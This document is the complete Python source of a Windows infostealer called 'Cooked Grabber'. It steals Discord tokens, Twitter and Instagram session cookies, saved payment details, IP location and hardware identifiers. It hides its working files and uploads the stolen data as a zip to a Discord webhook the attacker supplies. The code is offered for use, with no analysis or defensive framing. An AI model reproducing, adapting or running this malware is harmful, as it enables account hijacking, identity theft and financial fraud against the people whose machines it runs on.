import os
import sys
from json import loads
from base64 import b64decode
from sqlite3 import connect
from shutil import copyfile
from threading import Thread 
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
from discord_webhook import DiscordEmbed, DiscordWebhook
from subprocess import Popen, PIPE
from urllib.request import urlopen, Request
from requests import get
from re import findall, search
import win32con
from win32api import SetFileAttributes, GetSystemMetrics
import browser_cookie3
from browser_history import get_history
from prettytable import PrettyTable
from platform import platform
from getmac import get_mac_address as gma
from pycountry import countries
from cpuinfo import get_cpu_info
from psutil import virtual_memory
from collections import defaultdict
from zipfile import ZipFile, ZIP_DEFLATED

website = ['discord.com', 'twitter.com', 'instagram.com']

def get_hwid():
    p = Popen('wmic csproduct get uuid', shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split('\n')[1]

def get_user_data(tk):
    headers = {'Authorization': tk}
    response = get('https://discordapp.com/api/v6/users/@me', headers=headers).json()
    return [response['username'], response['discriminator'], response['email'], response['phone']]

def has_payment_methods(tk):
    headers = {'Authorization': tk}
    response=get('https://discordapp.com/api/v6/users/@me/billing/payment-sources',  headers=headers).json()
    return response

def cookies_grabber_mod(u):
    cookies = []
    browsers = [
        "chrome",
        "edge",
        "firefox",
        "brave",
        "opera",
        "vivaldi",
        "chromium",
    ]
    for browser in browsers:
        try:
            cookies.append(str(getattr(browser_cookie3, browser)(domain_name=u)))
        except:
            pass
    return cookies

def get_Personal_data():
    try:
        ip_address=urlopen(Request('https://api64.ipify.org')).read().decode().strip()
        country=urlopen(Request(f'https://ipapi.co/{ip_address}/country_name')).read().decode().strip()
        city=urlopen(Request(f'https://ipapi.co/{ip_address}/city')).read().decode().strip()
    except:
        city="City not found -_-"
        country="Country not found -_-"
        ip_address="No IP found -_-"
    return [ip_address, country, city]

def find_His():
    table = PrettyTable(padding_width=1)
    table.field_names = ["CurrentTime", "Link"]
    for his in get_history().histories:
        a, b = his
        if len(b) <= 100:
            table.add_row([a, b])
        else:
            x_= b.split("//")
            x__, x___= x_[1].count('/'), x_[1].split('/')
            if x___[0] != 'www.google.com':
                if x__ <= 5:
                    b = f"{x_[0]}//"
                    for p in x___:
                        if x___.index(p) != len(x___) - 1:
                            b += f"{p}/"
                    if len(b) <= 100:
                        table.add_row([a, b])
                    else:
                        table.add_row([a, f"{x_[0]}//{x___[0]}/[...]"])
                else:
                    b = f"{x_[0]}//{x___[0]}/[...]"
                    if len(b) <= 100:
                        table.add_row([a, b]) 
                    else:
                        table.add_row([a, f"{x_[0]}//{x___[0]}/[...]"])
    return table.get_string()

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = loads(local_state)
    key = b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_data(data, key):
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            return str(CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            return ""

def main():
    filename = "Cookies.db"
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
    if not os.path.isfile(filename):
        copyfile(db_path, filename)
        SetFileAttributes(filename, win32con.FILE_ATTRIBUTE_HIDDEN)
    db = connect(filename)
    db.text_factory = lambda b: b.decode(errors="ignore")
    result = []
    for w in website:
        if w == 'discord.com':
            tokens = []
            def discord_tokens(path):
                for file_name in os.listdir(path):
                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                            for token in findall(regex, line):
                                if token not in tokens:
                                    tokens.append(token)
            paths = [
                os.path.join(os.getenv('LOCALAPPDATA'),"Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
                os.path.join(os.getenv('APPDATA'), "Discord", "Local Storage", "leveldb"),
                os.path.join(os.getenv('APPDATA'), "Opera Software", "Opera Stable"),
                os.path.join(os.getenv('APPDATA'), "discordptb"),
                os.path.join(os.getenv('APPDATA'), "discordcanary"),
                os.path.join(os.getenv('LOCALAPPDATA'), "BraveSoftware", "Brave-Browser", "User Data", "Default"),
                os.path.join(os.getenv('LOCALAPPDATA'), "Yandex", "YandexBrowser", "User Data", "Default")
            ]
            threads = []
            def find_wb(wb):
                if os.path.exists(wb):
                    threads.append(Thread(target=discord_tokens, args=(wb,)))
            for j in paths:
                find_wb(j)
            for t in threads:
                t.start()
                t.join()
        elif w == 'twitter.com':
            t_cookies, t_lst = ([] for _ in range(2))
            for b in cookies_grabber_mod('twitter.com'):
                t_cookies.append(b.split(', '))
            for c in t_cookies:
                for y in c:
                    if search(r"auth_token", y) != None:
                        t_lst.append(y.split(' ')[1].split("=")[1])
        elif w == 'instagram.com':
            insta_cookies, insta_lst = ([] for _ in range(2))
            for b in cookies_grabber_mod('instagram.com'):
                insta_cookies.append(b.split(', '))
            browser_ = defaultdict(dict)
            for c in insta_cookies:
                if all([search(r"ds_user_id", str(c))!=None, search(r"sessionid", str(c))!=None, search(r"csrftoken", str(c))!=None]):
                    for y in c:
                        conditions = [search(r"ds_user_id", y)!=None, search(r"sessionid", y)!=None, search(r"csrftoken", y)!=None]
                        if any(conditions):
                            browser_[insta_cookies.index(c)][conditions.index(True)] = y.split(' ')[1].split("=")[1]
            for x in list(dict(browser_).keys()):
                insta_lst.append(list(dict(browser_)[x].items()))
            for x in insta_lst:
                for y in x:
                    if x.index(y) != y[0]:
                        x[x.index(y)], x[y[0]] = x[y[0]], x[x.index(y)]
            for x in insta_lst:
                for y in x:
                    x[x.index(y)] = y[1]
    all_data_p, lst_b = ([] for _ in range(2))
    for x in tokens:
        lst_b = has_payment_methods(x)
        try:
            for n in range(len(lst_b)):
                if lst_b[n]['type'] == 1:
                    writable = [lst_b[n]['brand'], lst_b[n]['type'], lst_b[n]['last_4'], lst_b[n]['expires_month'], lst_b[n]['expires_year'], lst_b[n]['billing_address']]
                    if writable not in all_data_p:
                        all_data_p.append(writable)
                elif lst_b[n]['type'] == 2:
                    writable_2 = [lst_b[n]['email'], lst_b[n]['type'], lst_b[n]['billing_address']]
                    if writable_2 not in all_data_p:
                        all_data_p.append(writable_2)
        except:
            pass
    db.commit()
    db.close()
    try:
        os.remove('Cookies.db')
    except:
        pass
    return [tokens, list(set(t_lst)), list(set(tuple(element) for element in insta_lst)), all_data_p]

def replace_new(path):
    if os.path.exists(path):
        os.remove(path)

def send_webhook(DISCORD_WEBHOOK_URLs):
    p_lst = get_Personal_data()
    cpuinfo = get_cpu_info()
    main_info = main()
    discord_T, twitter_T, insta_T = (PrettyTable(padding_width=1) for _ in range(3))
    discord_T.field_names, twitter_T.field_names, insta_T.field_names, verified_tokens = ["Discord Tokens", "Username", "Email", "Phone"], ["Twitter Tokens [auth_token]"], ["ds_user_id", "sessionid", "csrftoken"], []
    for t_ in main_info[0]:
        try:
            lst = get_user_data(t_)
            username, email, phone = f"{lst[0]}#{lst[1]}", lst[2], lst[3]
            discord_T.add_row([t_, username, email, phone])
            verified_tokens.append(t_)
        except:
            pass
    for _t in main_info[1]:
        twitter_T.add_row([_t])
    for _t_ in main_info[2]:
        insta_T.add_row(_t_)
    pay_l = []
    for _p in main_info[3]:
        if _p[1] == 1:
            payment_card = PrettyTable(padding_width=1)
            payment_card.field_names = ["Brand", "Type","Last 4", "Expiration", "Billing Adress"]
            payment_card.add_row([_p[0], _p[2], "Debit or Credit Card", f"{_p[3]}/{_p[4]}", _p[5]])
            pay_l.append(payment_card.get_string())
        elif _p[1] == 2:
            payment_p = PrettyTable(padding_width=1)
            payment_p.field_names = ["Email", "Type", "Billing Adress"]
            payment_p.add_row([_p[0], "Paypal", _p[2]])
            pay_l.append(payment_p.get_string())
    files_names = [["Discord Tokens.txt", "discord_T"], ["Twitter Token.txt", "twitter_T"], ["Instagram Token.txt", "insta_T"]]
    for x_, y_ in files_names:
        if (y_ == files_names[0][1] and len(main_info[0])!=0) or (y_ == files_names[1][1] and len(main_info[1])!=0) or (y_ == files_names[2][1] and len(main_info[2])!=0):
            replace_new(x_)
            with open(x_, 'w') as wr:
                SetFileAttributes(x_, win32con.FILE_ATTRIBUTE_HIDDEN)
                wr.write(eval(f"{y_}.get_string()"))
    replace_new("data.zip")
    with ZipFile("data.zip", mode='w', compression=ZIP_DEFLATED) as zip:
        SetFileAttributes("data.zip", win32con.FILE_ATTRIBUTE_HIDDEN)
        if payment_card or payment_p:
            replace_new("Payment Info.txt")
            with open("Payment Info.txt", 'w') as f:
                SetFileAttributes("Payment Info.txt", win32con.FILE_ATTRIBUTE_HIDDEN)
                for i in pay_l:
                    f.write(f"{i}\n")
            zip.write("Payment Info.txt")
            os.remove("Payment Info.txt")
        for name_f, _ in files_names:
            if os.path.exists(name_f):
                zip.write(name_f)
                os.remove(name_f)
    for URL in DISCORD_WEBHOOK_URLs:
        webhook = DiscordWebhook(url=URL, username='H4XOR', avatar_url="https://images-ext-1.discordapp.net/external/0b5bkDNyeu-6aaEBkJECuydS2b0hIFcnnSNuvhlUjbM/https/i.pinimg.com/736x/42/d2/f5/42d2f541c7e6437272b01920b97a7282.jpg")
        embed = DiscordEmbed(title='Cooked Grabber', color='00FF00')
        embed.add_embed_field(name='SYSTEM USER INFO', value=f":pushpin:`PC Username:` **{os.getenv('UserName')}**\n:computer:`PC Name:` **{os.getenv('COMPUTERNAME')}**\n:globe_with_meridians:`OS:` **{platform()}**\n", inline=False)
        embed.add_embed_field(name='IP USER INFO', value=f":eyes:`IP:` **{p_lst[0]}**\n:golf:`Country:` **{p_lst[1]}** :flag_{countries.get(name=p_lst[1]).alpha_2.lower()}:\n:cityscape:`City:` **{p_lst[2]}**\n:shield:`MAC:` **{gma()}**\n:wrench:`HWID:` **{get_hwid().strip()}**\n", inline=False)
        embed.add_embed_field(name='PC USER COMPONENT', value=f":satellite_orbital:`CPU:` **{cpuinfo['brand_raw']} - {round(float(cpuinfo['hz_advertised_friendly'].split(' ')[0]), 2)} GHz**\n:nut_and_bolt:`RAM:` **{round(virtual_memory().total / (1024.0 ** 3), 2)} GB**\n:desktop:`Resolution:` **{GetSystemMetrics(0)}x{GetSystemMetrics(1)}**\n", inline=False)
        embed.add_embed_field(name='ACCOUNT HACKED', value=f":red_circle:`Discord:` **{len(verified_tokens)}**\n:purple_circle:`Twitter:` **{len(main_info[1])}**\n:blue_circle:`Instagram:` **{len(main_info[2])}**\n", inline=False)
        card_e, paypal_e = ":white_check_mark:" if 'payment_card' in locals() else ":x:", ":white_check_mark:" if 'payment_p' in locals() else ":x:"
        embed.add_embed_field(name='PAYMENT INFO FOUNDED', value=f":credit_card:`Debit or Credit Card:` {card_e}\n:money_with_wings:`Paypal:` {paypal_e}", inline=False)
        embed.set_author(
            name="H4X0R-TEAM",
            url="https://github.com/h4x0r-project"
        )
        embed.set_footer(text='By Lemon.-_-.#3714 & cr4sh3d.py#2160')
        embed.set_timestamp()
        with open("data.zip", 'rb') as f:
            webhook.add_file(file=f.read(), filename=f"Cooked-Grabber-{os.getenv('UserName')}.zip")
        webhook.add_embed(embed)
        webhook.execute()
    os.remove("data.zip")

if __name__ == "__main__":
    if len(sys.argv) == 1:
        send_webhook(['YOUR DISCORD WEBHOOK URL'])
    else:
        del sys.argv[0]
        send_webhook(sys.argv)
